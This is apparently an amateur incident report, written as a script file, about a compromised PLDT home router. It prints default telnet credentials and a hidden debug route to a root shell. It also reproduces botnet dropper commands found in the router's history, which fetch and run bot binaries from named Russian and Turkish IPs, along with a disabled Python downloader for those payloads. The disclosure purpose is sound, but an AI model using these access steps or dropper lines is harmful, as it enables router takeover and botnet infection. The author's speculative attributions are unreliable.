# -*- coding: utf-8 -*-
#!/bin/bash

# Easy-to-Remember Title: "PH-Rassiya 6 Packs Cyberattack" or "PLDT Russian Roulette"
# Incident name: "PRR-221 P100KS-IR" Cyberattack
# Meaning: (PLDT Russian Roulette February 2021 Possible Hundred Thousand(s) Infected Routers)
# Affected: PLDT Telecom Routers (IoT)
# Discovered: 2021-02-27 09:15AM (Philippine Time)
# Discovered by: d46081ef0ca887c4e7aeeb01b5cc82ed ; Filipino ; 21
# Contact: <the email where you receive this message> (PLEASE KEEP ME SAFE) Contact me for follow up.
# Is there a bounty? Contact me for follow up.
# Description: A Possible Massive Cyber Threat Infection discovered by an "accident".



"""
Reason behind the discovery:

It's funny because it all started with pranking people on Omegle.
I didn't expect I would get into a discovery of a serious matter.

It's been two days since Omegle temporarily 'banned' our network due to my unusual behaviour (which is pranking other people for fun).
I was attempting to make content on my fake YouTube vlog. All I want is to set the network IP address into dynamic mode in order to change the WAN IP address to get access again on Omegle.
But I didn't know that time that PLDT Home Fibr is already configured to Dynamic IP Address. What I did that time was I accessed Superadmin account and I enabled the Telnet port and access it
in the hope of finding a way to get the admin account credential... Fast forward... I couldn't find the credentials for the Admin account. Then I remember something about the crippling speed of
the Internet, I assumed that maybe reboot via the telnet command should do the trick to speed up the router. After I reboot, it doesn't change, the speed never change.



At first, I only login to Telnet to get the Admin credentials: (But turns out to be a failure)


login: gepon
password: gepon


# Enabling config

telnet> enable
password: gepon


Config enabled

Config# cd web


As said above, I paraphrase, I used to access the Superadmin account of PLDT instead, in order to gain access to Telnet and in order to get the Admin account credentials. It turns out I failed dumping credentials for the Admin account.


Config\web# get web user username admin
Config\web# get web admin username adminpldt

(On both. It just output `% Unknown command.`)


As I told above, what I did was rebooting it because I believed it would make internet faster and it will refresh the router. Another failure attempt of trying.
I also have read on Google that PLDT Home Fibr is already configured to Dynamic IP, that means this is what I wanted to do. I thought that rebooting the router could change my IP address.
Thinking that it was time to reboot. Because it would not only refresh the router, it would also change my IP address (in the hope of unbanning me from the Omegle chatroom).

This is the moment when I reboot the system via Telnet:

telnet> reboot


It then reboots, nothing much changes happened. Still slow like a snail running in a racing competition.
I guess it changes the IP Address after the reboot. I forgot the recent IP Address before it and I just assume that it changed.
This is the moment I stopped trying. Fast forward.. I have finally got the default credendials for Admin account on the internet.
But since I believed I already changed my public IP "it's now useless to me" in my internal monologue.


About Omegle, the dynamic IP doesn't fix the problem I was still banned and still I am.
But I have successfully fixed it. By clearing cookies (mema) and opening a private window.
I'm still banned on normal mode browser but Omegle is accessible in private window.
The issue was not about Omegle blocking my IP, it's more like they banned me by reading my Cookies.
Just cookies, not browser fingerprints because private and normal window share the same fringerprint.
Yes, that was nice and great. I can now communicate with other beings. Buttttttttt........
I lose my interest meeting people on Omegle...... What interests me that time? Guess what..

Due to my boredoom and frustration I decided to get root on to the router out of my curiosity, to seek knowledge for educational purposes.
And as well as to explore the inner-workings of the router. Playing with shell without harming it, just educating myself. And also for fun.
To fuel my curiosity. Is it legal? Maybe, it's Linux and I suppose Linux-based embedded system shall not forbid the open-source philosophy
to tinkerers, researchers, and reverse engineers with a good intention.


The steps I did to get access to root user shell via Telnet:
(Port 23 is only open.)
user@me:~$ telnet 192.168.1.1 23
login: gepon
password: gepon

(I'm logged in)

telnet> ddd
WRI(DEBUG_H)> shell
WRI(DEBUG_H)> exit
telnet> exit

This opens a new port 26, as stated in the "WRI(DEBUG_H)" I have to access Telnet @ port 26.

PORT    STATE SERVICE
23/tcp  open  telnet
26/tcp  open  rsftp

Now, there are two protocols for Telnet to access to. But I shall connect to port 26 in order to get root shell access.


(On a new terminal window)

user@me:~$ telnet 192.168.1.1 26
login: root
password: GEPON

~#


(ROOT SHELL ACCESS SUCCESS!!!)


I was at the root level of the router's OS.
My joy was so strong that I could see the inner workings of the router,
the netstat, ps, uname, and many more.
I explored the filesystem paths. And I did many explorations that
the command history piled up my traces. I tried to clear it but it seemed like it doesn't work.

So what I did that time was to see how dirty my command history was... I cringe a lot seeing those.
I continued until I have seen something that doesn't belong to me. It's in the form of hex formatted bytecode.
This is what I first found in the history after the reboot. It was located next to my history after the reboot.

/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00
\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00
\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'


Hexedit dump:

00000000   7F 45 4C 46  01 01 01 61  00 00 00 00  00 00 00 00  .ELF...a........
00000010   02 00 28 00  01 00 00 00  20 83 00 00  34 00 00 00  ..(..... ...4...
00000020   E4 03 00 00  02 02 00 00  34 00 20 00  02 00 28 00  ........4. ...(.
00000030   05 00 04 00  01 00 00 00  00 00 00 00  00 80 00 00  ................
---  bytecode_1       --0x0/0x40-----------------------------------------------



I thought at first it was just some sort of a mechanism of PLDT Telecom similar to a built-in killswitch installed to their product. But turns out it wasn't. Read further.
As I dig deeper. I concluded that it wasn't, why, I decoded that bytecode to raw utf-8 characters. What I saw was intriguing. A MAGIC byte starts at the very beginning (0x0) of executable for Linux.
The format it describes is ELF header. Elf stands for "Executable Linkable Format", elf file is an executable file for *nix-based or Linux machines.



The second statement after "&&" (chain commands together) [means run the next statement if the first succeeds]:


Hexedit dump:

00000000   45 43 48 4F  44 4F 4E 45                            ECHODONE
---  bytecode_2       --0x0/0x8------------------------------------------------


It appears to be a raw string. But I think it has nothing to do with the main operation. It's just a rubber ducky, I suppose.



THE STATEMENT SAYS "if overwriting the magic bytes to .d succeeds" then print ECHODONE.


This is one of the coolest things they did that I just saw for the first time. I thought the architecture specific payload was well-crafted in a single payload but in the case of what I discovered, each payload is separated and they will just let the binary work even if it is not compatible with the target machine.
It will only bite once it meet the compatible architecture. That's what I understand in the name of payloads and this is not a solid claim.


"I want to know more" always repeats in my head. And I then scrolled up through the history. And I noticed something like this:
/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b


What really caught my attention at first was this: http:// [[195.62.53.96]] /bot.aarch64
It seems like it doesn't belong to the Philippine IP Range.

I thought at first these were just "bots" from a legitimate PLDT servers so I calmed myself.
Until I noticed the IP address of the server. Seems like this doesn't belong to Philippine IP range.
So I copied it and pasted it to an OSINT IP Tracker Online. (https://www.ip-tracker.org/locator/ip-lookup.php?ip=195.62.53.96)

I WAS SHOCKED FROM WHAT I'VE SEEN. I FIRST SAW THE FLAG OF RUSSIA. AND THEN ITS LABEL "Russian Federation".



IP Address: 	195.62.53.96
Reverse DNS:	96.53.62.195.in-addr.arpa
Hostname: 	x.msc.tf
Nameservers:	
garrett.ns.cloudflare.com >> 172.64.35.195
audrey.ns.cloudflare.com >> 108.162.194.66
Location For an IP: 195.62.53.96
Continent:	Europe (EU)
Country:	Russian Federation
Capital:	Moscow
State:	Unknown
City Location:	Unknown
ISP:	IT Expert LLC
Organization:	IT Expert LLC
AS Number:	AS44812 IT Expert LLC
Time Zone:	Europe/Moscow




After that, I looked up into whois, this is what I saw:

user@kali:~$ whois 195.62.53.96 -B
% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See http://www.ripe.net/db/support/db-terms-conditions.pdf
%
% Information related to '195.62.52.0 - 195.62.53.255'
% Abuse contact for '195.62.52.0 - 195.62.53.255' is 'abuse@ipserver.su'

inetnum:        195.62.52.0 - 195.62.53.255
netname:        RU-IPSERVER
country:        RU
org:            ORG-ISL73-RIPE
admin-c:        MN12340-RIPE
tech-c:         MN12340-RIPE
status:         ASSIGNED PI
mnt-by:         IP-SERVER-MNT
mnt-by:         RIPE-NCC-END-MNT
created:        2019-04-02T11:53:05Z
last-modified:  2019-04-02T11:53:05Z
source:         RIPE

organisation:   ORG-ISL73-RIPE
org-name:       IP SERVER LLC
country:        RU
org-type:       LIR
address:        st. Shabolovka, 34, building 3 (marked for IP SERVER LLC)
address:        115419
address:        Moscow
address:        RUSSIAN FEDERATION
e-mail:         nikolay.m@ipserver.su
admin-c:        MN12340-RIPE
tech-c:         MN12340-RIPE
abuse-c:        AR36839-RIPE
mnt-ref:        IP-SERVER-MNT
mnt-by:         RIPE-NCC-HM-MNT
mnt-by:         IP-SERVER-MNT
created:        2019-02-05T15:41:27Z
last-modified:  2020-12-16T13:07:24Z
source:         RIPE
phone:          +74956486813

person:         Morozov Nikolay
address:        st. Shabolovka, 34, building 3 (marked for IP SERVER LLC)
address:        115419
address:        Moscow
address:        RUSSIAN FEDERATION
phone:          +74956486813
nic-hdl:        MN12340-RIPE
mnt-by:         IP-SERVER-MNT
created:        2019-02-05T15:41:26Z
last-modified:  2019-02-05T15:41:27Z
source:         RIPE

% Information related to '195.62.52.0/23AS44812'

route:          195.62.52.0/23
descr:          IpServer
origin:         AS44812
mnt-by:         IP-SERVER-MNT
created:        2016-07-13T11:16:22Z
last-modified:  2019-02-16T13:53:08Z
source:         RIPE

% This query was served by the RIPE Database Query Service version 1.99 (HEREFORD)




[ St. Shabolovka, 34, building 3 (marked for IP SERVER LLC) ]
Google Maps: https://www.google.com/maps/place/Shabolovka+St,+34+строение+3,+Moskva,+Russia,+115419/@55.7181306,37.6075986,18z/




I fainted from what I discovered. It was unexpected. I just looked into the vast emptiness of space for minutes due to a shocking discovery.
I didn't scroll much after the very first url. So I decided to continue while being nervous of what I will see next.
Here are the sequence of history: (I am not sure if this is the exact order, still valid though)

# You'll see below that it uses busybox to gain access on the machine
# I am not sure if it's BusyBox Command Injection or something critical.


/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b

/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b

/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b

/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b

/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b

/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b

/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b

/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00
\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00
\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'



At the very top before the malicious statements are my own statements before the reboot, so that means, there's an autoboot malware that loads up these bash commands in order to get those payloads.
"Are the autoboot malware cross-compatible?" I haven't found yet the autoboot malware I'm talking about.


But first, let's examine the a single piece of statement
/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b



"
  I have no clear idea how they did exploited the router but I'm pretty sure it's not only "us". We're not the only victim. Look at CVE-2017–17215 (as an example).
  We're not the only customers are in the hands of these bad guys. My Tito said "Matagal nang naggaganito yung internet namin 2019-2020 palang."
  I was shocked from what he said. "20mbps itong plan namin tapos dati isang click mo lang ay maglo-load agad yung Google.com". I didn't know that
  my relative's internet plan is 20mbps, I thought it was just 1 or 2mbps even though they have pisonet business. This dissapointed me from what I heard.
  The problem of slow internet happens outside the ISP. I think this discovery could be the answer to why their or other's internet is crippling slow.
  Turns out this malware infection is eating up our internet bandwidth.  "



How the payload dropping mechanism works?

This is the first time I've seen such type of implementing malicious payload.
But first of all, let's analyse the contents. And see how far the rabbit hole goes.

As you can see, there are 6 URI pointed at some (bot.*) locations. Let's assume these are payload files.

	http://195.62.53.96/bot.armeb,
	http://195.62.53.96/bot.arm4,
	http://195.62.53.96/bot.arm5,
	http://195.62.53.96/bot.arm6,
	http://195.62.53.96/bot.arm7,
	http://195.62.53.96/bot.aarch64,

It seems suspicious because something is popping in my head when I think of the word bot,
There's a terminology "bot" in the field of CyberSecurity. Which means a "Botnet"; an infected machine.
That can be accessed via the Internet communication.

Noong nagkaroon ito ng access sa busybox ay gumawa ito ng way sa pamamagitan ng wget in order to download these payloads {armeb, arm4, arm5, arm6, arm7, aarch64} as you can see above.



(Right now. While I'm writing this at 3:23 AM (March 1, 2021) the Internet disappeared!!!!)
I could not even ping the router for a few minutes.

Just sharing the time where the server is located:
  10:29 pm
  Sunday, 28 February 2021 (GMT+3)
  Time in Moscow, Russia 
The time here is 3:29 AM, just 19 hours time difference.

This is a snippet result of pinging the router, it's struggling to respond.
(I already know something unauthorised is occupying the CPU space of the router.)

PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=57.8 ms
64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=80.10 ms
64 bytes from 192.168.1.1: icmp_seq=3 ttl=64 time=106 ms - <HIGH>
64 bytes from 192.168.1.1: icmp_seq=4 ttl=64 time=129 ms - <HIGH>
64 bytes from 192.168.1.1: icmp_seq=5 ttl=64 time=381 ms - <HIGH>
64 bytes from 192.168.1.1: icmp_seq=6 ttl=64 time=545 ms - <HIGH>
64 bytes from 192.168.1.1: icmp_seq=7 ttl=64 time=218 ms - <HIGH>
64 bytes from 192.168.1.1: icmp_seq=13 ttl=64 time=1308 ms - <WOW!>
64 bytes from 192.168.1.1: icmp_seq=14 ttl=64 time=454 ms - <HIGH>
64 bytes from 192.168.1.1: icmp_seq=16 ttl=64 time=598 ms - <HIGH>
64 bytes from 192.168.1.1: icmp_seq=17 ttl=64 time=310 ms - <HIGH>
64 bytes from 192.168.1.1: icmp_seq=18 ttl=64 time=21.4 ms - the time when it became normal.
64 bytes from 192.168.1.1: icmp_seq=19 ttl=64 time=375 ms
64 bytes from 192.168.1.1: icmp_seq=20 ttl=64 time=21.9 ms
64 bytes from 192.168.1.1: icmp_seq=21 ttl=64 time=179 ms
64 bytes from 192.168.1.1: icmp_seq=23 ttl=64 time=28.6 ms
(...........)

^C
--- 192.168.1.1 ping statistics ---
35 packets transmitted, 28 received, 20% packet loss, time 206ms
rtt min/avg/max/mdev = 21.266/191.427/1308.037/272.940 ms, pipe 2



But if you ping Google, the connection could not be established.
This is the proof that something strange is going on.

ping: google.com: Temporary failure in name resolution


Update: The traffic goes back to normal.
IF THERE'S REALLY NO INTERNET. IT SHOULD SHOW RED LIGHT IN THE ROUTER. BUT IT DIDN'T.
THE LED IS YELLOW AND NO DISCONNECTION IS INDICATING. YOU KNOW SOMETHING STRANGE IS GOING ON.





AND THERE'S ANOTHER PAYLOAD DROPPING STATEMENT ORIGINATES FROM Istanbul Turkey:

/bin/busybox wget http://141.98.119.27:80/batkek/arm -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.arm.wget; >.z
/bin/busybox wget http://141.98.119.27:80/batkek/arm7 -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.arm7.wget; >.z



IP Address: 	141.98.119.27
Reverse DNS:	** server can't find 27.119.98.141.in-addr.arpa: SERVFAIL
Hostname: 	141.98.119.27
Location For an IP: 141.98.119.27
Continent:	Asia (AS)
Country:	Turkey   IP Location Find In Turkey (TR)
Capital:	Ankara
State:	Istanbul
City Location:	Istanbul
Postal:	34846
ISP:	Unknown
Organization:	Unknown
AS Number:	Unknown


WHOIS


user@kali:~$ whois 141.98.119.27 -B
% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See http://www.ripe.net/db/support/db-terms-conditions.pdf
%
% Information related to '141.98.119.0 - 141.98.119.255'
% Abuse contact for '141.98.119.0 - 141.98.119.255' is 'clouds@ngdatacenter.com'

inetnum:        141.98.119.0 - 141.98.119.255
netname:        TR-NGDATACENTER
country:        TR
admin-c:        CA9115-RIPE
tech-c:         CA9115-RIPE
status:         ASSIGNED PA
mnt-by:         mnt-us-ngdatacenter1-1
created:        2019-06-24T12:06:49Z
last-modified:  2019-06-24T12:08:24Z
source:         RIPE

person:         Cemil Arslan
address:        cevizli mh. zuhal cd. ritim istanbul A3 Kat:31 D:167 Maltepe
address:        34846
address:        istanbul
address:        TURKEY
phone:          +13026131405
nic-hdl:        CA9115-RIPE
mnt-by:         mnt-us-ngdatacenter1-1
created:        2019-01-09T13:21:28Z
last-modified:  2019-01-09T13:21:28Z
source:         RIPE

% Information related to '141.98.119.0/24AS205399'

route:          141.98.119.0/24
origin:         AS205399
mnt-by:         mnt-us-ngdatacenter1-1
created:        2019-06-24T12:15:09Z
last-modified:  2019-06-24T12:15:09Z
source:         RIPE

% This query was served by the RIPE Database Query Service version 1.99 (ANGUS)




[ Cevizli mh. zuhal cd. ritim istanbul A3 Kat:31 D:167 Maltepe, 34846 ]
Google Maps: https://www.google.com/maps/place/Cevizli,+34846+Maltepe%2Fİstanbul,+Turkey/@40.9194392,29.1465155,2477m










"""












"""
Offenses:
 * BusyBox Command Injection
 * Blind-Aggressive Payload Dropping [for: {armeb, arm4, arm5, arm6, arm7, aarch64}]
Possible offenses:
 * Man In The Middle Attack
 * Distributed Denial of Service Attack
 * Port in router compromised by hackers. 4547/udp (listener) [at risk: CVE-2020-4547]



(side thoughts; what is the purpose of '1489/agent' program as appeared in netstat?)
 
 Is this infection politically motivated?
 Or 

"""


"""
It's still a big puzzle to me how hackers entered the router. Even if host range and closed ports on the WAN are inaccessible.
I look at 3 angles:
 * They bypass the firewall of Internet web controllers.
 * Inside job? It seems impossible.
 * Someone compromised a computer on LAN and found exploit.
"""


"""
To :
"""


#armeb, arm4, arm5, arm6, arm7, aarch64

import os
# [DON'T] directly access this while under investigation
payload_from_russia = [
	"http://195.62.53.96/bot.armeb",
	"http://195.62.53.96/bot.arm4",
	"http://195.62.53.96/bot.arm5",
	"http://195.62.53.96/bot.arm6",
	"http://195.62.53.96/bot.arm7",
	"http://195.62.53.96/bot.aarch64"
]
# Run Tor First! (sudo service tor restart)
for payload in payload_from_russia:
	# wget over Tor -+-+ (I suggest wget, not other programs "para hindi matunugan")
	# we should mimic the payload dropping mechanism that they (Russian hackers) have performed.
	# but with a twist of using Tor for an obvious reason.
	# Update: I attempted to request but the connection is refused.
	break
	print("Downloading {0}.....".format(payload))
	os.system("proxychains wget {0}".format(payload)) #[warn] you hereby


# The payload we've downloaded is ready to reverse engineer.


"""
Proposed solutions:
Remove non-root file utility programs such as dd, wget, etc from /bin
Or move these somewhere in /sbin or implement root restrictions to them.

[???] Since they have access to BusyBox, I speculate that they've been into BusyBox Command Injection

Patch the kernel and remaster the operating system of all infected routers.
Close all open ports in the range of all publicly accessible IP. (correctly executed)


In the router: Port 4547 is open

"""








# My Uncle said, dapat ko daw kayong singilin sa discovery na ito. Sa pag-effort ko ng report. Bug bounty.



# I need a job, please get me out of my school I don't belong here.
# I need a job. Pls. Bounty prize doesn't matter. Just a decent job.
